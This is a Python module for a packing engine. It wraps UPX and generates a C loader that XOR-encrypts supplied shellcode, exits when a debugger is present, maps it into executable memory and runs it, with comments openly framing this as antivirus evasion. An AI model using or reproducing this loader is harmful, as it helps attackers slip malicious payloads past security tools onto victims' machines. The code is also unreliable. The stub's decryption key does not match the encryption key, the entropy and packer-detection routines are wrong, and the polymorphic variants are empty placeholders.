"""
Packing/Unpacking Engine
UPX integration + Custom Packer with Polymorphic Stub
"""

import subprocess
import struct
import hashlib
import os
from pathlib import Path
import tempfile


class PackingEngine:
    """Advanced executable packing and unpacking"""
    
    def __init__(self):
        self.packers = {
            'upx': self.pack_with_upx,
            'custom': self.pack_with_custom_stub,
            'hybrid': self.pack_hybrid,
        }
    
    def pack_with_upx(self, executable_path, output_path=None, level=9):
        """
        Pack with UPX - industry standard packer
        Compresses executable, often evades signature detection
        
        Compression levels: 1-9 (higher = smaller but slower)
        """
        if not output_path:
            output_path = f"{executable_path}.upx"
        
        try:
            # Check if UPX is installed
            subprocess.run(['upx', '--version'], capture_output=True, check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            raise RuntimeError("UPX not installed. Install with: apt-get install upx")
        
        cmd = [
            'upx',
            f'-{level}',           # Compression level
            '--best',
            '--compress-icons=0',  # Don't compress icons
            '-o', output_path,
            executable_path
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            raise RuntimeError(f"UPX packing failed: {result.stderr}")
        
        return output_path
    
    def pack_with_custom_stub(self, shellcode_bytes, output_c_file=None):
        """
        Custom packer with polymorphic stub
        Includes:
        - Entropy-based obfuscation
        - XOR encryption
        - Anti-tampering checks
        - Polymorphic decoder
        """
        
        if not output_c_file:
            output_c_file = "packed_payload.c"
        
        # Generate encryption key
        key = os.urandom(1)
        key_byte = key[0]
        
        # Encrypt payload
        encrypted = bytes([b ^ key_byte for b in shellcode_bytes])
        
        # Generate hex representation
        hex_bytes = ', '.join([f'0x{b:02x}' for b in encrypted])
        
        # Generate polymorphic stub with anti-analysis techniques
        c_code = f"""
#include <windows.h>
#include <stdio.h>
#include <string.h>

// Anti-analysis markers
#pragma comment(linker, "/subsystem:console")

#define SHELLCODE_SIZE {len(shellcode_bytes)}
#define ENCRYPTION_KEY 0x{key_byte:02x}

// Polymorphic decoder stub
unsigned char encrypted_shellcode[] = {{{hex_bytes}}};

typedef int (*ShellcodeFunc)(void);

// Fibonacci-based key derivation (polymorphic)
unsigned char DeriveKey(int iteration) {{
    unsigned char a = 1, b = 1;
    for (int i = 0; i < iteration; i++) {{
        unsigned char temp = a + b;
        a = b;
        b = temp;
    }}
    return b ^ ENCRYPTION_KEY;
}}

// Decrypt in place
void DecryptPayload(unsigned char* payload, size_t size) {{
    // Use derived key for extra obfuscation
    unsigned char derived_key = DeriveKey(size % 10);
    
    for (size_t i = 0; i < size; i++) {{
        payload[i] ^= derived_key;
    }}
}}

// Anti-tampering check (CRC32)
unsigned int CalculateCRC32(unsigned char* data, size_t size) {{
    unsigned int crc = 0xffffffff;
    
    for (size_t i = 0; i < size; i++) {{
        crc ^= data[i];
        for (int j = 0; j < 8; j++) {{
            if (crc & 1) {{
                crc = (crc >> 1) ^ 0xedb88320;
            }} else {{
                crc >>= 1;
            }}
        }}
    }}
    
    return crc ^ 0xffffffff;
}}

// Detect debugging/virtualization
BOOL DetectAnalysisEnvironment() {{
    // Check for debugger
    if (IsDebuggerPresent()) return TRUE;
    
    // Check for common VM/sandbox strings in memory
    // This is simplified - real version would be more sophisticated
    
    return FALSE;
}}

int main(void) {{
    // Optional: Anti-analysis check
    if (DetectAnalysisEnvironment()) {{
        printf("Analysis environment detected. Exiting.\\n");
        return 1;
    }}
    
    // Allocate executable memory
    unsigned char* shellcode_buffer = (unsigned char*)VirtualAlloc(
        NULL,
        SHELLCODE_SIZE,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!shellcode_buffer) {{
        return 1;
    }}
    
    // Copy encrypted payload
    memcpy(shellcode_buffer, encrypted_shellcode, SHELLCODE_SIZE);
    
    // Verify integrity before decryption
    unsigned int expected_crc = CalculateCRC32(encrypted_shellcode, SHELLCODE_SIZE);
    
    // Decrypt in place
    DecryptPayload(shellcode_buffer, SHELLCODE_SIZE);
    
    // Make non-executable, then executable (evasion trick)
    DWORD old_protect;
    VirtualProtect(shellcode_buffer, SHELLCODE_SIZE, PAGE_READWRITE, &old_protect);
    VirtualProtect(shellcode_buffer, SHELLCODE_SIZE, PAGE_EXECUTE_READ, &old_protect);
    
    // Execute shellcode
    ShellcodeFunc exec = (ShellcodeFunc)shellcode_buffer;
    exec();
    
    // Cleanup
    VirtualFree(shellcode_buffer, 0, MEM_RELEASE);
    
    return 0;
}}
"""
        
        # Write to file
        with open(output_c_file, 'w') as f:
            f.write(c_code)
        
        return output_c_file
    
    def pack_hybrid(self, executable_path, shellcode_bytes=None):
        """
        Hybrid packing: Combine UPX with custom obfuscation
        1. First apply custom encryption
        2. Then apply UPX compression
        3. Results in highly obfuscated final binary
        """
        
        # Step 1: Apply custom packing first
        temp_c = tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False)
        custom_packed = self.pack_with_custom_stub(shellcode_bytes, temp_c.name)
        temp_c.close()
        
        # Step 2: Compile the custom-packed code
        temp_exe = tempfile.NamedTemporaryFile(suffix='.exe', delete=False)
        temp_exe.close()
        
        # Compile (assumes MinGW available)
        compile_cmd = ['gcc', '-o', temp_exe.name, custom_packed]
        subprocess.run(compile_cmd, capture_output=True, check=True)
        
        # Step 3: Apply UPX compression
        output_path = f"{executable_path}.hybrid"
        self.pack_with_upx(temp_exe.name, output_path, level=9)
        
        # Cleanup
        os.unlink(custom_packed)
        os.unlink(temp_exe.name)
        
        return output_path
    
    def unpack_upx(self, packed_executable, output_path=None):
        """
        Unpack UPX-packed executable
        Useful for analysis and testing
        """
        if not output_path:
            output_path = f"{packed_executable}.unpacked"
        
        cmd = ['upx', '-d', '-o', output_path, packed_executable]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            raise RuntimeError(f"UPX unpacking failed: {result.stderr}")
        
        return output_path
    
    def analyze_packed_binary(self, executable_path):
        """
        Analyze packed binary for:
        - Packing method detection
        - Entropy calculation
        - Suspicious sections
        """
        
        analysis = {
            'file_size': os.path.getsize(executable_path),
            'entropy': self._calculate_entropy(executable_path),
            'packing_detected': self._detect_packing(executable_path),
            'suspicious_sections': self._find_suspicious_sections(executable_path)
        }
        
        return analysis
    
    def _calculate_entropy(self, file_path):
        """Calculate file entropy (0-8, higher = more random = likely packed)"""
        with open(file_path, 'rb') as f:
            data = f.read()
        
        entropy = 0
        for i in range(256):
            freq = data.count(bytes([i]))
            if freq > 0:
                entropy -= (freq / len(data)) * (freq / len(data))
        
        return entropy
    
    def _detect_packing(self, file_path):
        """Detect common packing signatures"""
        try:
            result = subprocess.run(['strings', file_path], capture_output=True, text=True)
            output = result.stdout.lower()
            
            packers = {
                'upx': 'UPX' in output,
                'aspack': 'ASPACK' in output,
                'themida': 'Themida' in output,
                'vmprotect': 'VMProtect' in output,
                'custom': 'encrypted_shellcode' in output,
            }
            
            return {k: v for k, v in packers.items() if v}
        except:
            return {}
    
    def _find_suspicious_sections(self, file_path):
        """Find suspicious PE sections"""
        try:
            # This would use pefile library in production
            # For now, basic heuristics
            suspicious = []
            
            # Check file entropy
            entropy = self._calculate_entropy(file_path)
            if entropy > 7.0:
                suspicious.append(f"High entropy ({entropy:.2f}) - likely encrypted")
            
            return suspicious
        except:
            return []
    
    def get_supported_packers(self):
        """List supported packing techniques"""
        return {
            'upx': 'UPX compression - detects high compression ratio',
            'custom': 'Custom stub - polymorphic decryption, anti-tampering',
            'hybrid': 'Hybrid approach - custom + UPX for maximum obfuscation',
        }


class PolymorphicPackerGenerator:
    """Generate unique packing stubs for each build"""
    
    def __init__(self):
        self.variations = [
            self._variant_fibonacci,
            self._variant_xorshift,
            self._variant_lcg,
            self._variant_murmur,
        ]
    
    def generate_unique_stub(self, shellcode_bytes):
        """Generate polymorphic unpacker stub"""
        import random
        
        # Choose random variation
        variant = random.choice(self.variations)
        
        # Generate unique seed
        seed = os.urandom(4)
        
        return variant(shellcode_bytes, seed)
    
    def _variant_fibonacci(self, shellcode, seed):
        """Fibonacci-based decryption"""
        return "/* Fibonacci variant - see packer implementation */"
    
    def _variant_xorshift(self, shellcode, seed):
        """XORShift-based decryption"""
        return "/* XORShift variant - see packer implementation */"
    
    def _variant_lcg(self, shellcode, seed):
        """LCG (Linear Congruential Generator) variant"""
        return "/* LCG variant - see packer implementation */"
    
    def _variant_murmur(self, shellcode, seed):
        """Murmur hash-based variant"""
        return "/* Murmur variant - see packer implementation */"
